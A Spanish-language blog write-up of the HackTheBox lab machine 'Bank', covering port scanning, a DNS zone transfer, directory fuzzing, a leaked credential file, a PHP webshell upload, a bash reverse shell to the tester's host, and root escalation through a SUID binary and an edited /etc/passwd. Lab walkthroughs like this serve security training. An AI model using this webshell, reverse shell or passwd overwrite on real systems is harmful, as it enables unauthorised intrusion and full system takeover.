---
title: Bank WriteUp
date: 2024-05-27
categories: [WriteUps, Máquinas Linux]
tags: [RCE]
image:
  path: ../../assets/img/writeups/Bank/bank.png
  width: 528
  height: 340
  alt: Banner Bank
---

¡Paxaaa!. Hoy resolvemos máquina Bank. Fuzzing, Information Leakage y File Upload para obtener acceso al sistema objetivo. Escalada sencillita.

## Reconocimiento

Me conecto a la VPN de la plataforma HackTheBox y spawneo la máquina llamada **Bank** que tendrá la IP **10.10.10.29** -le cuesta un poco spawnearla-.

Probemos que tengamos conectividad a la máquina Bank haciéndole un ping:

```sh
❯ ping -c 1 10.10.10.29
PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
64 bytes from 10.10.10.29: icmp_seq=1 ttl=63 time=48.2 ms

--- 10.10.10.29 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.211/48.211/48.211/0.000 ms
```

Un paquete envíado, un paquete recibido, tenemos conectividad. Además el **ttl** -time to live- es de 63, como se aproxima a 64 estaremos antes un sistema Linux.

Toca escanear los puertos y así ver por donde podemos atacar:

```sh
❯ nmap 10.10.10.29 -p- --open --min-rate 5000 -vvv -n -Pn -oN ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-27 08:30 CEST
Initiating SYN Stealth Scan at 08:30
Scanning 10.10.10.29 [65535 ports]
Discovered open port 53/tcp on 10.10.10.29
Discovered open port 22/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
Completed SYN Stealth Scan at 08:30, 13.56s elapsed (65535 total ports)
Nmap scan report for 10.10.10.29
Host is up, received user-set (0.048s latency).
Scanned at 2024-05-27 08:30:10 CEST for 14s
Not shown: 59891 closed tcp ports (reset), 5641 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
           Raw packets sent: 71271 (3.136MB) | Rcvd: 59992 (2.400MB)

```

Estas son las opciones que usamos:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.29: Dirección IP objetivo, la cual quiero escanear
* -oN ports : Exportará el output a un fichero normal de nmap llamado "ports"

La herramienta **nmap** nos sacó los puertos 22/ssh, 53/dns, 80/http. Averiguemos un poco más sobre estos puertos lanzando una serie de script básicos con la opción **-sC** y la versión de los servicios con la opción **-sV**.

```sh
❯ nmap 10.10.10.29 -p22,53,80 -sC -sV -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-27 08:37 CEST
Nmap scan report for 10.10.10.29
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)
|   2048 b8e015482d0df0f17333b78164084a91 (RSA)
|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)
|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
```

Pues bien, tenemos esos tres puertos abiertos -por TCP-.  
Para el servicio OpenSSH tenemos la vulnerabilidad de User Enumeration hasta la versión 7.2, la de la máquina es la 6.6 así que podría ser vulnerable pero de momento voy a pasar de esto.  
Para la versión del servidor web no tenemos nada, habría que mirar la web desde el navegador.  


## Servicio DNS

Podemos empezar probando a realizar un ataque de transferencia de zona (AXFR) al servidor DNS -alojado en el puerto 53-. El objetivo de este ataque es tener ua copia completa de la zona DNS de un dominio. La zona DNS contiene toda la información sobre los registros DNS de un dominio, incluyendo nombres de host, direcciones IP asociadas, servidores de correo y otros registros importantes. La estructura para lanzar el ataque AXFR con el comando **dig** es la siguiente:

```sh
> dig axfr DOMINIO @IP
# También podría intentarse simplemente así:
> dig @10.10.10.29 axfr
```

Como solo tenemos la IP:

```sh
❯ dig @10.10.10.29 axfr

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> @10.10.10.29 axfr
; (1 server found)
;; global options: +cmd
;; Query time: 50 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Mon May 27 08:57:03 CEST 2024
;; MSG SIZE  rcvd: 28
```

No sacamos nada. Intentaré averiguar el dominio asociado a esa IP de algunas maneras:

```sh
# Este comando intentará encontrar el nombre de dominio asociado con la dirección IP especificada:
❯ nslookup 10.10.10.29
** server cant find 29.10.10.10.in-addr.arpa: NXDOMAIN

# El -x indica que se debe realizar una búsqueda inversa:
❯ dig -x 10.10.10.29

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> -x 10.10.10.29
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 53273
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: a0d731cd226e11750100000066542ee4c24e2cba58e3d5c9 (good)
;; QUESTION SECTION:
;29.10.10.10.in-addr.arpa.	IN	PTR

;; AUTHORITY SECTION:
10.IN-ADDR.ARPA.	86400	IN	SOA	10.IN-ADDR.ARPA. . 0 28800 7200 604800 86400
.. SNIP ..
# Tampoco nos saca un dominio

# Este comando también realiza una búsqueda inversa de DNS y es más directo y sencillo que los anteriores.
❯ host 10.10.10.29
Host 29.10.10.10.in-addr.arpa. not found: 3(NXDOMAIN)
```

El AXFR sin indicarle el dominio no ha funcionado. No hallamos el dominio asociado a la IP de momento. Más tarde suponemos el dominio **bank.htb** y si funciona.

## Servicio Web

Probemos más suerte en la web del objetivo -dado que está el puerto 80/http abierto-.  
Antes de acudir al navegador a visualizar la página lanzaré la herramienta **whatweb**, la usamos para ver las tecnologías que corren en la Web. También podríamos ver algún dominio de esta manera:

```sh
❯ whatweb http://10.10.10.29
http://10.10.10.29 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
```

Echemos un vistazo a la página. Nos encontramos con la página por defecto de Apache.

![Web]({{ 'assets/img/writeups/Bank/web.png' | relative_url }}){: .center-image }

Normalmente algunas máquinas de htb tienen Virtual Hosting -guardan varias webs en la misma IP-. El nombre del dominio suele ser **NOMBREMAQUINA.htb**, en este caso sería factible que fuera **bank.htb**. Lo añado al /etc/host:

```sh
# Contenido /etc/hosts
.. SNIP ..
10.10.10.29       bank.htb
.. SNIP ..
```

Y ahora desde el navegador en la URL; `http://bank.htb`. Ahora sí parece que tenemos algo relevante. Un panel de inicio de sesión:

![Web2]({{ 'assets/img/writeups/Bank/web2.png' | relative_url }}){: .center-image }

Primero echaré un vistazo a la página fuente. Podría encontrar algo interesante por aquí, algún comentario o ruta.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>HTB Bank - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- styles -->
    <link href="./assets/css/theme/styles.css" rel="stylesheet">
  </head>
  ... SNIP ...
```

Poquita cosa, algunas rutas como **assets**. Dentro de esta hay otras carpetas. Veo **thumbs.db**, aunque la extensión te entusiasme los archivos thumbs.db no llevan credenciales, llevan imagenes en miniatura de la web, sus referencias y metadatos.

Antes de lanzar alguna herramienta de fuzzing para averiguar más subdirectorios voy a probar de nuevo un ataque de transferencia de zona, ya que tengo el dominio bank.htb:

```sh
❯ dig axfr bank.htb @10.10.10.29

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.10.10.29
ns.bank.htb.		604800	IN	A	10.10.10.29
www.bank.htb.		604800	IN	CNAME	bank.htb.
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 43 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Mon May 27 15:48:04 CEST 2024
;; XFR size: 6 records (messages 1, bytes 171)
```

Y ahora sí que funciona. Nos saca un nuevo dominio **chris.bank.htb**. Lo añado al archivo /etc/hosts:

```plaintext
# Contenido /etc/hosts:

.. SNIP ..
10.10.10.29       bank.htb  chris.bank.htb
```

Echemos un vistazo a ese nuevo subdominio. Tenemos de nuevo el "Apache2 Ubuntu Default Page" como cuando nos metíamos con `http://10.10.10.29`.

Quiero averiguar más directorios. Realizaré un fuzzing de subdirectorios y archivos con **wfuzz** al primero dominio **bank.htb**:

```sh
❯ wfuzz --hc=404 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bank.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   302        188 L    319 W      7322 Ch     "# directory-list-2.3-medium.txt"                                                                                      
000000007:   302        188 L    319 W      7322 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                      
000000003:   302        188 L    319 W      7322 Ch     "# Copyright 2007 James Fisher"                                                                                        
000000014:   302        188 L    319 W      7322 Ch     "http://bank.htb/"                                                                                                     
000000009:   302        188 L    319 W      7322 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000005:   302        188 L    319 W      7322 Ch     "# This work is licensed under the Creative Commons"                                                                   
000000006:   302        188 L    319 W      7322 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000004:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000008:   302        188 L    319 W      7322 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000010:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000012:   302        188 L    319 W      7322 Ch     "# on at least 2 different hosts"                                                                                      
000000011:   302        188 L    319 W      7322 Ch     "# Priority ordered case-sensitive list, where entries were found"                                                     
000000013:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000002:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000164:   301        9 L      28 W       305 Ch      "uploads"                                                                                                              
000000291:   301        9 L      28 W       304 Ch      "assets"                                                                                                               
000002190:   301        9 L      28 W       301 Ch      "inc"                                                                                                                  
^Z
zsh: suspended  wfuzz --hc=404 -w  http://bank.htb/FUZZ
❯ kill %
```

Podría usar otro diccionario más pequeño, siempre lo paro antes de que termine -o tener más paciencia-. Tenemos dos directorios nuevos; **uploads** e **inc**.  
Para el subdirectorio /uploads no tengo permisos "Forbidden". Podría hacer otro fuzzing por aquí.  
En el subdirectorio /inc hay algunos archivos .php sin contenido.

Voy a lanzar el diccionario **common.txt** que creo que es más pequeño y no está nada mal:

```sh
❯ locate common.txt
/home/guise/.ZAP/fuzzers/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/Extensions.Mostcommon.txt
/opt/SecLists/Discovery/File-System/OBEX_common.txt
/opt/SecLists/Discovery/Web-Content/common.txt
/opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt
/opt/theHarvester/wordlists/general/common.txt
/usr/share/dirb/wordlists/common.txt
/usr/share/dirb/wordlists/extensions_common.txt
/usr/share/dirb/wordlists/mutations_common.txt
/usr/share/fern-wifi-cracker/extras/wordlists/common.txt
/usr/share/metasploit-framework/data/wordlists/http_owa_common.txt
/usr/share/metasploit-framework/data/wordlists/sap_common.txt
/usr/share/wfuzz/wordlist/general/common.txt
.. SNIP ...
❯ wc -l /opt/SecLists/Discovery/Web-Content/common.txt
4723 /opt/SecLists/Discovery/Web-Content/common.txt
❯ wfuzz --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://bank.htb/FUZZ/

... SNIP ...
Target: http://bank.htb/FUZZ/
Total requests: 4723

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000025:   403        10 L     30 W       285 Ch      ".htpasswd"                                                                                                            
000000024:   403        10 L     30 W       285 Ch      ".htaccess"                                                                                                            
000000023:   403        10 L     30 W       280 Ch      ".hta"                                                                                                                 
000000729:   200        20 L     104 W      1696 Ch     "assets"                                                                                                               
000002142:   403        10 L     30 W       281 Ch      "icons"                                                                                                                
000002198:   302        188 L    319 W      7322 Ch     "index.php"                                                                                                            
000002188:   200        19 L     89 W       1530 Ch     "inc"                                                                                                                  
000003719:   403        10 L     30 W       289 Ch      "server-status"                                                                                                        
000004322:   403        10 L     30 W       283 Ch      "uploads"                                                                                                              

Total time: 21.58777
Processed Requests: 4723
Filtered Requests: 4714
Requests/sec.: 218.7812
```

Nos saca uno nuevo; **server-status** pero por el código de respuesta lo tendremos prohíbido. Comprobamos y si.  
Dado el index.php inicial que se nos mostraba, y otros archivos .php alojadas, podemos pensar que almacena este tipo de archivos. Buscaré por las extensiones php y también txt, por si acaso.

```sh
❯ wfuzz --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt -z list,php-txt http://bank.htb/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ.FUZ2Z
Total requests: 9446

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000046:   403        10 L     30 W       283 Ch      ".hta - txt"                                                                                                           
000000045:   403        10 L     30 W       283 Ch      ".hta - php"                                                                                                           
000000047:   403        10 L     30 W       288 Ch      ".htaccess - php"                                                                                                      
000000049:   403        10 L     30 W       288 Ch      ".htpasswd - php"                                                                                                      
000000048:   403        10 L     30 W       288 Ch      ".htaccess - txt"                                                                                                      
000000050:   403        10 L     30 W       288 Ch      ".htpasswd - txt"                                                                                                      
000004389:   302        188 L    319 W      7322 Ch     "index - php"                                                                                                          
000005033:   200        51 L     125 W      1974 Ch     "login - php"                                                                                                          
000005063:   302        0 L      0 W        0 Ch        "logout - php"                                                                                                         
000008051:   302        83 L     186 W      3291 Ch     "support - php"                                                                                                        

Total time: 42.98991
Processed Requests: 9446
Filtered Requests: 9436
Requests/sec.: 219.7259
```

Si en la URL busco la nueva página encontrada `http://bank.htb/support.php` me redigirá a login.php. Me gustaría interceptar la petición antes de que rediriga. Para ello abro el burpsuite, intercepto la petición, luego click derecho y doy a Do Intercept --> Intercept Response, y damos "Forward":

```plaintext
HTTP/1.1 302 Found
Date: Mon, 27 May 2024 14:31:25 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Length: 3291
Connection: close
Content-Type: text/html

.... SNIP ....

                		<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
				        <a class='btn btn-primary' href='javascript:;'>
				            Choose File...
				            <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
				        </a>
				        &nbsp;

```

Interesante ese mensaje; "[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]".  
Fuzzearé por .htb esta vez:

```sh
❯ wfuzz --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt http://bank.htb/FUZZ.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ.htb
Total requests: 4723

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000025:   403        10 L     30 W       288 Ch      ".htpasswd"                                                                                                            
000000024:   403        10 L     30 W       288 Ch      ".htaccess"                                                                                                            
000000023:   403        10 L     30 W       283 Ch      ".hta"                                                                                                                 

Total time: 21.71630
Processed Requests: 4723
Filtered Requests: 4720
Requests/sec.: 217.4863
```

> Esta máquina es un poco cabrona digamos..el sudirectorio que buscamos está al final de un diccionario algo grande. He de decir también que añadiendo 200 hilos, -t=200, no ha tardado tanto, tres minutos o así.

Usaré el directory-2.3-medium.txt en búsqueda de subidrectorios:

```sh
❯ wfuzz --hc=404 -t 200 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bank.htb/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000007:   302        188 L    319 W      7322 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                      
000000001:   302        188 L    319 W      7322 Ch     "# directory-list-2.3-medium.txt"                                                                                      
000000003:   302        188 L    319 W      7322 Ch     "# Copyright 2007 James Fisher"                                                                                        
000000164:   403        10 L     30 W       283 Ch      "uploads"                                                                                                              
000000291:   200        20 L     104 W      1696 Ch     "assets"                                                                                                               
000002190:   200        19 L     89 W       1530 Ch     "inc"                                                                                                                  
000000083:   403        10 L     30 W       281 Ch      "icons"                                                                                                                
000000014:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                                                                    
000000011:   302        188 L    319 W      7322 Ch     "# Priority ordered case-sensitive list, where entries were found"                                                     
000000002:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000006:   302        188 L    319 W      7322 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000005:   302        188 L    319 W      7322 Ch     "# This work is licensed under the Creative Commons"                                                                   
000000009:   302        188 L    319 W      7322 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000012:   302        188 L    319 W      7322 Ch     "# on at least 2 different hosts"                                                                                      
000000010:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000008:   302        188 L    319 W      7322 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000013:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000000004:   302        188 L    319 W      7322 Ch     "#"                                                                                                                    
000045240:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                                                                    
000095524:   403        10 L     30 W       289 Ch      "server-status"                                                                                                        
000192709:   200        1014 L   11038 W    253503 Ch   "balance-transfer"                                                                                                     

Total time: 118.3139
Processed Requests: 220560
Filtered Requests: 220539
Requests/sec.: 1864.192
```

Y ahí tenemos el subdiretorio **/balance-transfer**. Veamos que contiene desde el navegador. Parece que es un conjunto de archivos, unos 50, con la extensión .acc (seguramente Graphics Accounts Data File). Todos tienen un **size** muy parecido. Voy a realizar un curl a ese directorio y jugar con los comandos **awk** y **grep** para ver mejor y buscar algún archivo con un size distinto:

```sh
> curl -s -X GET http://bank.htb/balance-transfer/

... SNIP ...
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="ffc3cab8b54397a12ca83d7322c016d4.acc">ffc3cab8b54397a12ca83d7322c016d4.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="ffdfb3dbd8a9947b21f79ad52c6ce455.acc">ffdfb3dbd8a9947b21f79ad52c6ce455.acc</a></td><td align="right">2017-06-15 09:50  </td><td align="right">584 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>

curl -s -X GET http://bank.htb/balance-transfer/ | awk -F'[>]' '{print $6, $12}' | awk '{print $2, $3}'

... SNIP ...
href="ff8a6012cf9c0b6e5957c2cc32edd0bf.acc" 585
href="ff39f4cf429a1daf5958998a7899f3ec.acc" 584
href="ffc3cab8b54397a12ca83d7322c016d4.acc" 584
href="ffdfb3dbd8a9947b21f79ad52c6ce455.acc" 584

# Y ahora quitare las que tienen un content repetido:
❯ curl -s -X GET http://bank.htb/balance-transfer/ | awk -F'[>]' '{print $6, $12}' | awk '{print $2, $3}' | grep -vE "584|585|582|583"

href="09ed7588d1cd47ffca297cc7dac22c52.acc" 581
href="941e55bed0cb8052e7015e7133a5b9c7.acc" 581
href="68576f20e9732f1b2edc4df5b8533230.acc" 257
```

Vemos un archivo con un size de 287, diferente al resto. Veamoslo:

```sh
❯ curl -s -X GET http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

Tenemos un correo y una password, quizás con esto podramos acceder al panel de `http://bank.htb/login.php`. Escribimos las credenciales en el login y estamos dentro de lo que parece la cuenta del banco del usuario chris.

![Banco]({{ 'assets/img/writeups/Bank/banco.png' | relative_url }}){: .center-image }

### File Upload

En la pestaña **support** parece que podemos subir archivos. Probemos con un archivo .txt cualquiera pero nos salta el siguiente error "You cant upload this this file. You can upload only images.". Así que solo podremos subir imagenes. Podemos interceptar la petición por BurpSuite y probar cosillas -cambiar el content-type, extensión, inyección de codigo en imagen, etc- pero si recordamos en la página `http://bank.htb/support` nos encontramos la siguiente línea:

```plaintext
[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]
```

Crearé una webshell con la extensión .htb, lo llamare **pwn.htb**:

```php
<?php
    system($_REQUEST['cmd']);
?>
```

Vamos a subirlo. Ha ido bien. Había una carpeta /uploads encontrada haciendo fuzzing, llamemos al archivo subido desde la URL y de paso añadimos un comando; `http://bank.htb/uploads/pwn.htb?cmd=id`. Conseguimos RCE:

```plaintext
# El navegador nos devuelve:
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

## Shell con www-data

Ahora me gustaría obtener una reverse shell y así entrar al sistema objetivo. En la URL:

```plaintext
http://bank.htb/uploads/pwn.htb?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"

# Antes de enviar es mejor sustituir el & por %26, su código en hexadecimal. La URL no entiende muy bien el &
http://bank.htb/uploads/pwn.htb?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"
```
Antes de mandar lo de arriba nos ponemos en escucha:

```sh
> nc -nlvp 443
```

Y ahora nos lanzamos la reverse shell.

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.29] 37126
bash: cannot set terminal process group (1071): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/var/www/bank/uploads$ whoami
whoami
www-data
```

Realizaremos un tratamiento de la tty ahora. Nuestra tty no es full interactive así que vamos a mejorarla.

```sh
script /dev/null -c bash
# Pulsamos Ctrl + z

# Ahora estaríamos en máquin local
stty raw -echo; fg
reset xterm

# Volvemos a máquina remota
export TERM=xterm  # Como tipo terminal xterm
export SHELL=bash

# Por último las proporciones, puedes averiguarlas con el comando "stty size" en local
www-data@bank:/var/www/bank/uploads$ stty rows 38 columns 184
```

Consigamos la primera flag:

```sh
www-data@bank:/var/www/bank/uploads$ cd /home
www-data@bank:/home$ ls
chris
www-data@bank:/home$ cd chris
www-data@bank:/home/chris$ ls -la
total 28
drwxr-xr-x 3 chris chris 4096 Jan 11  2021 .
drwxr-xr-x 3 root  root  4096 Jan 11  2021 ..
lrwxrwxrwx 1 root  root     9 Jan 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 chris chris  220 May 28  2017 .bash_logout
-rw-r--r-- 1 chris chris 3637 May 28  2017 .bashrc
drwx------ 2 chris chris 4096 Jan 11  2021 .cache
-rw-r--r-- 1 chris chris  675 May 28  2017 .profile
-r--r--r-- 1 chris chris   33 May 29 09:34 user.txt
www-data@bank:/home/chris$ cat user.txt
d90174e457a65c4f40877930fe9742cb
```

Ahora toca escalar privilegios. Suelo usar los comandos que verás a continuación para ver opciones de escalada:

```sh
www-data@bank:/home/chris$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
# No está en grupos con posibles vías de escalada

www-data@bank:/home/chris$ sudo -l
[sudo] password for www-data: 
# No tenemos la password del usuario, así que no lo sabremos.

www-data@bank:/home/chris$ find / \-perm \-4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
... SNIP ...
```
## Escalando a root

En este último comando si que encontramos algo interesante. Tenemos con permiso SUID -opción de ejecutar como propietario del archivo/binario- el archivo **/var/htb/bin/emergency**.

```sh
www-data@bank:/home/chris$ ls -l /var/htb/bin/emergency
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
# El propietario del archivo es root así que el permiso SUID lo ejecutaremos como root

www-data@bank:/home/chris$ file /var/htb/bin/emergency
/var/htb/bin/emergency: setuid ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1fff1896e5f8db5be4db7b7ebab6ee176129b399, stripped
# Es un binario de 32 bits
```

Voy a ejecutarla por hacerme una idea de lo que hace:

```sh
# En esta ocasión la almohadilla de es un comentario, es la salida del comando.
www-data@bank:/home/chris$ /var/htb/bin/emergency
# whoami
root
# cd /root
# cat root.txt
68a4d273e0e53c1be724212e284107aa
```

Pues parece que el ejecutarla nos convierte directamente en root. Y ahí vemos la flag.

### Otra manera de escalar

Hay otra manera de escalar privilegios. Si buscamos por archivos con opción de escritura (para nuestro usuario):

```sh
www-data@bank:/home/chris$ find / -writable 2>/dev/null | grep -v proc
/var/lib/php5
/var/lib/apache2/fcgid
/var/lib/apache2/fcgid/sock
/var/crash
/var/www/bank
/var/www/bank/support.php
... SNIP ...
/etc/passwd
... SNIP ...
```

Encontramos el **/etc/passwd** con opcion de escritura. Cuando hacemos un `su USER` para cambiar de usuario, el sistema acude primero al /etc/passwd a ver si el usuario se encuentra, si se encuentra y en el lugar de la password esta la letra x entonces pasa a buscar la contraseña hasheada del usuario al /etc/shadow. Si coincide la contraseña que escribes con la del shadow te permite cambiar de usuario. Pero hay un truquillo, podemos cambiar ese **x** por una contraseña que nosotros inventemos pero en formato hash:

```sh
www-data@bank:/home/chris$ # openssh --help
www-data@bank:/home/chris$ openssl passwd
Password: 
Verifying - Password: 
3cg9iY6/5Pi6U
# Nos saca el hash en formato DES (por defecto)
```

Ahora en el lugar de la **x** de root colocaremos ese hash:

```plaintext
root:3cg9iY6/5Pi6U:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... SNIP ...
```

Guardamos (Ctrl + S) y salimos (Ctrl + X).

```sh
www-data@bank:/home/chris$ su root
Password:   # escribo hola
root@bank:/home/chris# whoami
root
```

Máquina Bank terminada. Escalada bastante fácil. Hay que tener algo de paciencia en el fuzzing de subdirectorios.





